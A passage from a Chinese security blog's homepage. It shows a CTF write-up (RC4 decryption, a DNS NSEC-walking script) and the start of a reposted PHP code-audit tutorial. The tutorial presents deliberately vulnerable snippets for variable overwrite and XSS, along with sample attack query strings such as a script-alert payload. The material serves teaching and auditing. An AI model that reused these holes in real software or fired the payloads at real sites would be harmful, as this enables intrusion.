<!doctype html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="ZEROYU, SEC" />





  <link rel="alternate" href="/atom.xml" title="ZEROYU" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />






<meta name="description" content="一只单线程HACKER">
<meta property="og:type" content="website">
<meta property="og:title" content="ZEROYU">
<meta property="og:url" content="http://zer0yu.github.io/index.html">
<meta property="og:site_name" content="ZEROYU">
<meta property="og:description" content="一只单线程HACKER">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ZEROYU">
<meta name="twitter:description" content="一只单线程HACKER">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://zer0yu.github.io/"/>





  <title> ZEROYU </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  



  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?414e74bab07e7101a26a8ca95416288a";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>








  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">ZEROYU</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup">
 <span class="search-icon fa fa-search"></span>
 <input type="text" id="local-search-input">
 <div id="local-search-result"></div>
 <span class="popup-btn-close">close</span>
</div>


    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/11/02/EIS-2017-DNS101题解/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/11/02/EIS-2017-DNS101题解/" itemprop="url">
                  EIS 2017 DNS101题解
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-02T21:26:11+08:00">
                2017-11-02
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/11/02/EIS-2017-DNS101题解/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/02/EIS-2017-DNS101题解/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/11/02/EIS-2017-DNS101题解/" class="leancloud_visitors" data-flag-title="EIS 2017 DNS101题解">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天跟大佬们在做EIS 2017运维挑战赛，我看的时候大佬们已经把web做的差不多了。所以我就来解决两道MISC。</p>
<h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>第一个是rc4的一个解密，挺简单的，手撸一个解密代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#密文：下面十六进制的一串；密钥：hello world</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4</span><span class="params">(data,key)</span>:</span></div><div class="line">  j=<span class="number">0</span></div><div class="line">  s=range(<span class="number">256</span>)</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">    j=(j+s[i]+ord(key[i%len(key)]))%<span class="number">256</span></div><div class="line">    s[i],s[j]=s[j],s[i]</div><div class="line">  i=<span class="number">0</span></div><div class="line">  j=<span class="number">0</span></div><div class="line">  out=[]</div><div class="line">  <span class="keyword">for</span> char <span class="keyword">in</span> data:</div><div class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></div><div class="line">    j=(j+s[i])%<span class="number">256</span></div><div class="line">    s[i],s[j]=s[j],s[i]</div><div class="line">    out.append(chr(ord(char)^s[(s[i]+s[j])%<span class="number">256</span>]))</div><div class="line">  <span class="keyword">return</span> <span class="string">''</span>.join(out)</div><div class="line">encodedata=rc4(<span class="string">'\xCA\xEE\x86\x30\x48\xC4\xEC\x56\x3D\x22\x2A\xBC\x9A\x95\x70\x23\x39\x76\x3B\xEE\x09\x29\x2B\x01\x54\x00\x87\x5E\x37\x23\x3E\x79\x8B\x7B\xA9\x20\x78'</span>,<span class="string">'hello world'</span>)</div><div class="line"><span class="keyword">print</span> encodedata</div></pre></td></tr></table></figure>
<h3 id="DNS-101"><a href="#DNS-101" class="headerlink" title="DNS 101"></a>DNS 101</h3><p>这个题我是懵逼了一上午，dig了一早上TXT没想到玄机在与NSEC(DNSSEC 的一部分 — 用来验证一个未存在的服务器，使用与 NXT（已过时）记录的格式)。还有一点就是dig any的用法，这个当时也是没有考虑到。（多谢rebirth的指点）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line">target = <span class="string">'what.is.my.flag.src.edu-info.edu.cn'</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">  output = subprocess.Popen([<span class="string">'dig any'</span>+<span class="string">' '</span>+target],stdout=subprocess.PIPE,shell=<span class="keyword">True</span>).communicate()</div><div class="line"></div><div class="line">  <span class="comment">#print output[0]</span></div><div class="line"></div><div class="line">  result = re.findall(<span class="string">".*NSEC(.*). TXT.*"</span>,output[<span class="number">0</span>])</div><div class="line"></div><div class="line">  <span class="keyword">print</span> result[<span class="number">0</span>].strip()</div><div class="line"></div><div class="line">  target = result[<span class="number">0</span>].strip()</div><div class="line"></div><div class="line">  flag = subprocess.Popen([<span class="string">'dig'</span>+<span class="string">' '</span>+target+<span class="string">' '</span>+<span class="string">'TXT'</span>],stdout=subprocess.PIPE,shell=<span class="keyword">True</span>).communicate()</div><div class="line">  <span class="comment">#EIS&#123;&#125;是flag的格式</span></div><div class="line">  <span class="keyword">if</span> <span class="string">'EIS'</span> <span class="keyword">in</span> flag[<span class="number">0</span>]:</div><div class="line">    <span class="keyword">print</span> flag[<span class="number">0</span>]</div><div class="line">    <span class="keyword">break</span></div></pre></td></tr></table></figure>
<p>最终结果：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-02%20%E4%B8%8B%E5%8D%889.23.28.png" alt="屏幕快照 2017-11-02 下午9.23.28"></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/10/31/转载-高级PHP应用程序漏洞审核技术/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/10/31/转载-高级PHP应用程序漏洞审核技术/" itemprop="url">
                  [转载]高级PHP应用程序漏洞审核技术
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-31T19:08:46+08:00">
                2017-10-31
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/10/31/转载-高级PHP应用程序漏洞审核技术/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/10/31/转载-高级PHP应用程序漏洞审核技术/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/10/31/转载-高级PHP应用程序漏洞审核技术/" class="leancloud_visitors" data-flag-title="[转载]高级PHP应用程序漏洞审核技术">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="高级PHP应用程序漏洞审核技术"><a href="#高级PHP应用程序漏洞审核技术" class="headerlink" title="高级PHP应用程序漏洞审核技术"></a>高级PHP应用程序漏洞审核技术</h2><p>Summary Php Application Source Code Audits Advanced Technology - Simplified Chinese</p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。</p>
<p>随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。</p>
<p>也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。</p>
<p>另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）</p>
<h3 id="传统的代码审计技术"><a href="#传统的代码审计技术" class="headerlink" title="传统的代码审计技术"></a>传统的代码审计技术</h3><p>WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc<code>[</code>$<code>_</code>GET,$<code>_</code>POST,$<code>_</code>COOKIE<code>]</code>，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。</p>
<p>PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。</p>
<p>其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。</p>
<h3 id="PHP版本与应用代码审计"><a href="#PHP版本与应用代码审计" class="headerlink" title="PHP版本与应用代码审计"></a>PHP版本与应用代码审计</h3><p>到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">版本</th>
<th style="text-align:left">占比</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">php4</td>
<td style="text-align:left">68%</td>
<td style="text-align:left">2000-2007，No security fixes after 2008/08，最终版本是php4.4.9</td>
</tr>
<tr>
<td style="text-align:left">php5</td>
<td style="text-align:left">32%</td>
<td style="text-align:left">2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!）</td>
</tr>
<tr>
<td style="text-align:left">php6</td>
<td style="text-align:left"></td>
<td style="text-align:left">目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc</td>
</tr>
</tbody>
</table>
<p>由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。</p>
<h3 id="其他的因素与应用代码审计"><a href="#其他的因素与应用代码审计" class="headerlink" title="其他的因素与应用代码审计"></a>其他的因素与应用代码审计</h3><p>很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/<code>*</code>nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。</p>
<p>所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。</p>
<h3 id="扩展我们的字典"><a href="#扩展我们的字典" class="headerlink" title="扩展我们的字典"></a>扩展我们的字典</h3><p>下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。</p>
<h3 id="变量本身的key"><a href="#变量本身的key" class="headerlink" title="变量本身的key"></a>变量本身的key</h3><hr>
<p>说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></div><div class="line"><span class="comment">//print_R($_GET); </span></div><div class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">print</span> $key.<span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2</div></pre></td></tr></table></figure>
<p>那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：） </p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求 : 无</td>
</tr>
<tr>
<td style="text-align:left">系统要求 : 无</td>
</tr>
<tr>
<td style="text-align:left">审计策略 : 通读代码</td>
</tr>
</tbody>
</table>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><hr>
<p>很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：</p>
<h3 id="遍历初始化变量"><a href="#遍历初始化变量" class="headerlink" title="遍历初始化变量"></a>遍历初始化变量</h3><p>请看如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//var.php?a=fuck</span></div><div class="line">$a=<span class="string">'hi'</span>;</div><div class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">	$$key = $value;</div><div class="line">&#125;</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$chs = <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span>($_POST &amp;&amp; $charset != <span class="string">'utf-8'</span>) &#123;</div><div class="line">	$chs = <span class="keyword">new</span> Chinese(<span class="string">'UTF-8'</span>, $charset);</div><div class="line">	<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">		$$key = $chs-&gt;Convert($value);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">unset</span>($chs);</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：通读代码</td>
</tr>
</tbody>
</table>
<h3 id="parse-str-变量覆盖漏洞"><a href="#parse-str-变量覆盖漏洞" class="headerlink" title="parse_str()变量覆盖漏洞"></a>parse_str()变量覆盖漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//var.php?var=new</span></div><div class="line">$var = <span class="string">'init'</span>;                     </div><div class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]); </div><div class="line"><span class="keyword">print</span> $var;</div></pre></td></tr></table></figure>
<p>该函数一样可以覆盖数组变量，上面的代码是通过$<code>_</code>SERVER[‘QUERY_STRING’]来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//var.php?var=1&amp;a[1]=var1%3d222</span></div><div class="line">$var1 = <span class="string">'init'</span>;</div><div class="line">parse_str($a[$_GET[<span class="string">'var'</span>]]);</div><div class="line"><span class="keyword">print</span> $var1;</div></pre></td></tr></table></figure>
<p>上面的代码通过提交$var来实现对$var1的覆盖。</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略（parse_str）</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找字符parse_str</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略（mb_parse_str）</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找字符mb_parse_str</td>
</tr>
</tbody>
</table>
<h3 id="import-request-variables-变量覆盖漏洞"><a href="#import-request-variables-变量覆盖漏洞" class="headerlink" title="import_request_variables()变量覆盖漏洞"></a>import_request_variables()变量覆盖漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'GLOBALS '</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"n"</span>;</div><div class="line">import_request_variables(<span class="string">'GPC'</span>);</div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'10.1.1.1'</span>) <span class="keyword">die</span>(<span class="string">'Go away!'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'Hello admin!'</span>;</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略（import_request_variables）</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找字符import_request_variables</td>
</tr>
</tbody>
</table>
<h3 id="PHP5-Globals"><a href="#PHP5-Globals" class="headerlink" title="PHP5 Globals"></a>PHP5 Globals</h3><p>从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//register_globals = &apos;ON&apos;</div><div class="line">//foo.php?GLOBALS[foobar]=HELLO</div><div class="line">echo $foobar; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>但是很多的程序没有考虑到这点，请看如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//为了安全取消全局变量</span></div><div class="line"><span class="comment">//var.php?GLOBALS[a]=aaaa&amp;b=111</span></div><div class="line"><span class="keyword">if</span> (ini_get(<span class="string">'register_globals'</span>)) <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $k=&gt;$v) <span class="keyword">unset</span>($&#123;$k&#125;);</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line"><span class="keyword">print</span> $_GET[b];</div></pre></td></tr></table></figure>
<p>如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：通读代码</td>
</tr>
</tbody>
</table>
<h3 id="magic-quotes-gpc与代码安全"><a href="#magic-quotes-gpc与代码安全" class="headerlink" title="magic_quotes_gpc与代码安全"></a>magic_quotes_gpc与代码安全</h3><hr>
<h3 id="什么是magic-quotes-gpc"><a href="#什么是magic-quotes-gpc" class="headerlink" title="什么是magic_quotes_gpc"></a>什么是magic_quotes_gpc</h3><p>当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：）</p>
<h3 id="哪些地方没有魔术引号的保护"><a href="#哪些地方没有魔术引号的保护" class="headerlink" title="哪些地方没有魔术引号的保护"></a>哪些地方没有魔术引号的保护</h3><p><em>1) $<code>_</code>SERVER变量</em></p>
<p>PHP5的$<code>_</code>SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略（$<code>_</code>SERVER变量）</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找字符<code>_</code>SERVER</td>
</tr>
</tbody>
</table>
<p><em>2) getenv()得到的变量（使用类似$<code>_</code>SERVER变量）</em></p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略（getenv()）</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找字符getenv</td>
</tr>
</tbody>
</table>
<p><em>3) $HTTP_RAW_POST_DATA与PHP输入、输出流</em></p>
<p>主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：</p>
